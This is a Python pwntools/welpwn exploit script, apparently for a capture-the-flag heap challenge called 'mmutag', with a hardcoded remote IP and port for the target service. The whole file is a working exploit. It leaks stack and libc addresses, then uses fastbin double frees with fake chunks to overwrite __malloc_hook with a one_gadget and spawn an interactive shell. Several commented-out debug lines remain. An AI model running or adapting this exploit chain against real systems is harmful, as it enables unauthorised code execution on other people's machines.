#https://github.com/matrix1001/welpwn

from PwnContext import *

try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')

if __name__ == '__main__':        
    context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux
    context.log_level = 'debug'
    # functions for quick script
    s       = lambda data               :ctx.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))

    debugg = 1
    logg = 0

    ctx.binary = './mmutag'
    ctx.remote_libc = './libc.so.6'
    
    ctx.debug_remote_libc = False # True for debugging remote libc, false for local.

    #ctx.breakpoints = [0x,0x]
    ctx.symbols = {'heap_pool':0x6020c0}
    #ctx.debug()
    if debugg:
    	rs()
    else:
		ctx.remote = ('183.129.189.62', 58604)
		rs(method = 'remote')
    if logg:
	    context.log_level = 'debug'
    # rs('remote') # uncomment this for exploiting remote target

    libc = ctx.libc # ELF object of the corresponding libc.
    
    def Choice(num):
    	sla('choise:',num)
    def Add(idx,content=" "):
    	Choice(1)
    	sla('id:',idx)
    	sa('content',content)
    	ru('OK')
    '''
    def Edit(idx,content):
    	Choice(4)
    	sla('Index:',idx)
    	sla('Content:',content)
    '''
    def Del(idx,):
    	Choice(2)
    	sla('id',idx)
    	ru('OK')
    
    def Set_stack(content):
    	Choice(3)
    	s(content)
    	ru('Your')
    context.arch = "amd64"

    payload = p64(0)+p64(0x71)+p64(0)+p64(0)
    sla('please input you name:',payload)
    ru("this is your tag: 0x")
    
    stack_addr = r(12)
    stack_addr = int(stack_addr,16)
    success("stack_addr:0x%x",stack_addr)
    #sl(1)
    #dbg('b *0x400A83')
    #raw_input()
    #sla('introduce',payload)
    #ru()
    #dbg()
    #raw_input()
    sleep(0.1)
    sla('choice',2)
    
    Add(3)
    Add(4)
    #Add(3)
    Del(3)
    Del(4)
    Del(3)

    #dbg()
    #raw_input()
    
    '''
    1->2->1
    '''
    payload = p64(0)+p64(0x71)+p64(0)+p64(0)
    Set_stack(payload)
    Add(5,p64(stack_addr-0x40))
    Add(6)
    Add(7,p64(0))
    #dbg()
    #raw_input()
    Add(1,'a'*0x40+'b'*0x8)
    #Add(7)
    #dbg()
    #raw_input()
    #Add(7)
    #Del(7)
    #Add(7,'a'*8*8)
    Set_stack('a'*0x20)
    ru('b'*0x8)
    libc_base = uu64(r(6))-0x20840
    success('libc:0x%x',libc_base)
    malloc_hook = libc_base + 0x3c4aed
    one_gadget = libc_base + 0xf0364
    #dbg()
    #raw_input()
    #Add(7)
    #Add(9)
    #Add(10)
    Del(3)
    Del(4)
    Del(3)

    #dbg()
    #raw_input()
    payload = p64(0x6020c5)
    Add(8,payload)
    Add(9)
    Add(10)
    #dbg()
    #raw_input()
    Add(2,'\x00'+p64(0)*6)
    #dbg()
    #raw_input()
    #Set_stack(payload)
    Del(10)
    Del(9)
    Del(10)
    Add(3,p64(malloc_hook))
    Add(4)
    Add(5)
    Add(6,'\x00'*3+p64(one_gadget)*8)
    success("one_gadget:0x%x",one_gadget)
    
    #dbg()
    #raw_input()
    #Del(7)
    #Add(8)
    Set_stack('\x00'*0x20)
    success('one_gadget:0x%x',one_gadget)
    #dbg()
    #raw_input()
    Choice(1)
    sla('id:',8)
    
    #Add(9,p64(one_gadget))
    #dbg()
    #raw_input()
    #Add(11,p64(one_gadget))
    #Del(9)









    #unlink
    #dbg()
    #raw_input()


    irt()
    # ipy() # if you have ipython, you can use this to check variables.


